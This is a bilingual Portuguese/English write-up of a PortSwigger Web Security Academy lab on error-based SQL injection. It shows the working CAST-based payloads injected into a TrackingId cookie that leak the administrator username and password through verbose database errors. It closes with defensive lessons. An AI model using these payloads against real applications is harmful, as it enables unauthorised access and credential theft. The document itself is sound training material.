# Lab 13 — Visible Error-Based SQL Injection

> 🇧🇷 [Português](#-português) · 🇺🇸 [English](#-english)

---

## 🇧🇷 Português

**Plataforma:** PortSwigger Web Security Academy  
**Categoria:** SQL Injection — Error-Based  
**Dificuldade:** 🟡 Practitioner  
**Data:** 2026-06-07

### Descrição

A aplicação executa uma query com o `TrackingId` e exibe mensagens de erro verbosas quando a query falha. O objetivo é explorar essas mensagens para vazar a senha do `administrator` diretamente no texto do erro.

### Conceito

**Error-based SQLi** aproveita mensagens de erro detalhadas do banco para exfiltrar dados. A técnica usa `CAST()` para forçar um erro de conversão de tipo: ao tentar converter uma string (como um username) para `int`, o banco falha e inclui o valor da string na mensagem de erro — expondo o dado diretamente na resposta.

### Reconhecimento

Adicionando `'` ao `TrackingId`:

```
TrackingId=ogAZZfxtOKUELbuJ'
```

A resposta retornou uma mensagem de erro verbosa com a query completa — confirmando que erros de sintaxe são exibidos ao usuário.

Adicionando `--` para fechar a query corretamente:

```
TrackingId=ogAZZfxtOKUELbuJ'--
```

Sem erro — a query é válida agora.

### Exploração

**Passo 1 — Forçar erro de tipo com CAST:**

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

Sem erro — query válida.

**Passo 2 — Adaptar para buscar usernames:**

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```

Erro — query truncada pelo limite de caracteres do campo. Solução: limpar o valor original do cookie para abrir espaço:

```
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

Erro retornado pelo banco:
```
ERROR: invalid input syntax for type integer: "administrator"
```

O username `administrator` vazou diretamente na mensagem de erro.

**Passo 3 — Extrair a senha:**

```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

A senha do `administrator` apareceu na mensagem de erro. Login realizado.

### O que aprendi

- Erros verbosos são uma vulnerabilidade por si só — nunca expor detalhes de query em produção
- `CAST(string AS int)` é uma forma elegante de forçar o banco a revelar o valor da string no erro
- O limite de caracteres do campo pode truncar payloads — limpar o valor original do cookie libera espaço
- `LIMIT 1` é necessário quando a subquery pode retornar múltiplas linhas

### Referências

- [PortSwigger — Visible Error-Based SQLi](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## 🇺🇸 English

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection — Error-Based  
**Difficulty:** 🟡 Practitioner  
**Date:** 2026-06-07

### Description

The application executes a query with the `TrackingId` and displays verbose error messages when the query fails. The goal is to exploit these messages to leak the `administrator` password directly in the error text.

### Concept

**Error-based SQLi** leverages detailed database error messages to exfiltrate data. The technique uses `CAST()` to force a type conversion error: when attempting to convert a string (like a username) to `int`, the database fails and includes the string value in the error message — exposing the data directly in the response.

### Reconnaissance

Appending `'` to the `TrackingId`:

```
TrackingId=ogAZZfxtOKUELbuJ'
```

The response returned a verbose error message with the full query — confirming syntax errors are displayed to the user.

Adding `--` to properly close the query:

```
TrackingId=ogAZZfxtOKUELbuJ'--
```

No error — the query is now valid.

### Exploitation

**Step 1 — Force type error with CAST:**

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

No error — valid query.

**Step 2 — Adapt to fetch usernames:**

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```

Error — query truncated by the field character limit. Solution: clear the original cookie value to free up space:

```
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

Database error returned:
```
ERROR: invalid input syntax for type integer: "administrator"
```

The username `administrator` leaked directly in the error message.

**Step 3 — Extract the password:**

```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

The `administrator` password appeared in the error message. Login completed.

### What I learned

- Verbose errors are a vulnerability in themselves — never expose query details in production
- `CAST(string AS int)` is an elegant way to force the database to reveal the string value in the error
- Field character limits can truncate payloads — clearing the original cookie value frees space
- `LIMIT 1` is necessary when the subquery could return multiple rows

### References

- [PortSwigger — Visible Error-Based SQLi](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
